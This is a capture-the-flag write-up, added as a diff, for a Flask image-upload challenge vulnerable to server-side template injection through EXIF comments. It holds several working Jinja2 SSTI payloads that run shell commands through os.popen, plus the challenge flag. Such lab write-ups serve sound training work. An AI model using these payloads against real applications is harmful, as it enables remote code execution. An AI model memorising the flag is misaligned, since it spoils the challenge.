@@ -1,0 +1,36 @@
+# CTF Challenge Write-up: SSTI via EXIF Data
+
+## Challenge Overview
+Web application with image upload functionality vulnerable to Server-Side Template Injection through EXIF metadata processing.
+
+## Exploitation Steps
+
+1. **Access Application**
+   - Navigate to http://localhost:5001
+   - Register: username `admin`, password `password123`
+   - Login with credentials
+
+2. **Prepare Malicious Image**
+   ```bash
+   exiftool -Comment='{{config.__class__.__init__.__globals__["os"].popen("cat /home/www/flag.txt").read()}}' image.jpg
+   ```
+
+3. **Upload & Trigger**
+   - Upload the modified image
+   - View uploaded image details
+   - SSTI payload executes in template rendering
+
+4. **Alternative Payloads**
+   ```
+   {{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /home/www/flag.txt').read()}}
+   {{request.application.__globals__.__builtins__.__import__('os').popen('cat /home/www/flag.txt').read()}}
+   ```
+
+## Flag Location
+`/home/www/flag.txt`
+
+## Vulnerability
+Flask template engine processes EXIF Comment field without sanitization, allowing Python code execution.
+
+## Flag Format
+`BCTF{Y0U_C4NNOt_F0o1_Y()uR531F}`
